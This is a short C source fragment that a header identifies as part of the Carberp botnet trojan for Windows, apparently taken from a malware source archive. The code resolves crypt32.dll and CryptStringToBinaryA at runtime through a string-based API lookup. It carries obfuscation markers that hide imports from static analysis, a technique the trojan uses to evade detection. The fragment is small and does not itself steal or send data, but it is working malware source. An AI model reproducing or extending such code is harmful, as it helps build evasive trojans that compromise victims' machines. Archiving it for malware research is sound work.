/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

HANDLE _CRYPT32 = 0;

BOOL (WINAPI *_CryptStringToBinaryA)( LPCTSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags );

void* padrCrypt32[] = { &_CryptStringToBinaryA };

void InitCrypt32()
{
 _CRYPT32 = _GetModuleHandle("crypt32.dll"); 
 if (/*@S==*/_CRYPT32 == NULL/*@E*/) _CRYPT32 = _LoadLibrary("crypt32.dll");

 InitAPIbyStr(padrCrypt32,_CRYPT32,"/*@S|*/00CryptStringToBinaryA/*@E*/|");
}

